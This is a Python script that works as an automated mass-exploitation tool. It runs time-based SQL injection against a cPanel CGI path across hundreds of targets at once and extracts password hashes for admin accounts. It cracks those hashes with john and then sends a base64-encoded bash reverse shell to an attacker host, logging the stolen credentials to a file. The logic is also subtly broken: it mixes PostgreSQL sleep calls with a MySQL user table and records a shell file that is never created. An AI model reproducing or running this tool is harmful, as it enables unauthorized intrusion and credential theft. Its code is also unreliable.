import aiohttp
import asyncio
import random
import string
import binascii
import subprocess
import sys
from urllib.parse import urljoin

THREADS = 400
DELAY = 7
USERS = ["cpanel","root","admin","billing","webmail"]

async def check_vuln(session, url):
    payload = f"/cgi-sys/defaultwebpage.cgi?id=1');SELECT CASE WHEN (1=1) THEN pg_sleep({DELAY}) ELSE pg_sleep(0) END--"
    try:
        start = asyncio.get_event_loop().time()
        await session.get(url + payload, timeout=DELAY+2)
        if asyncio.get_event_loop().time() - start > DELAY-0.5:
            return True
    except:
        pass
    return False

async def extract_hash(session, url, user):
    hash_val = ""
    for pos in range(1, 33):
        for char in "0123456789abcdef":
            inj = f"');SELECT CASE WHEN substring((SELECT password FROM mysql.user WHERE user='{user}'),{pos},1)='{char}' THEN pg_sleep(5) ELSE pg_sleep(0) END--"
            start = asyncio.get_event_loop().time()
            try:
                await session.get(url + "/cgi-sys/defaultwebpage.cgi?id=1" + inj)
            except:
                pass
            if asyncio.get_event_loop().time() - start > 4:
                hash_val += char
                print(f"[+] {user}:{hash_val}")
                break
    return hash_val

def crack_hash(md5_hash):
    with open("/tmp/.h","w") as f:
        f.write(md5_hash + "\n")
    result = subprocess.getoutput("john /tmp/.h --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5")
    return result.split()[-1] if " " in result else None

async def get_shell(session, url, user, pwd):
    rev = "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
    b64 = binascii.b2a_base64(rev.encode()).decode().strip()
    data = {"user":user, "pass":pwd, "cmd":f"echo {b64}|base64 -d|bash"}
    await session.post(urljoin(url, "/execute_cmd.php"), data=data)

async def crack_target(url):
    async with aiohttp.ClientSession(headers={"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0)"}) as s:
        if not await check_vuln(s, url):
            return
        for user in USERS:
            h = await extract_hash(s, url, user)
            if len(h) == 32:
                pwd = crack_hash(h)
                if pwd:
                    await get_shell(s, url, user, pwd)
                    print(f"[!] CRACKED → {url} | {user}:{pwd}")
                    with open("cracked.txt","a") as f:
                        f.write(f"{url} | {user} | {pwd} | {url}/shell.php\n")

async def worker(queue):
    while True:
        url = await queue.get()
        await crack_target(url.strip())
        queue.task_done()

async def main():
    queue = asyncio.Queue()
    for _ in range(THREADS):
        asyncio.create_task(worker(queue))
    for line in sys.stdin:
        await queue.put(line)
    await queue.join()

asyncio.run(main())
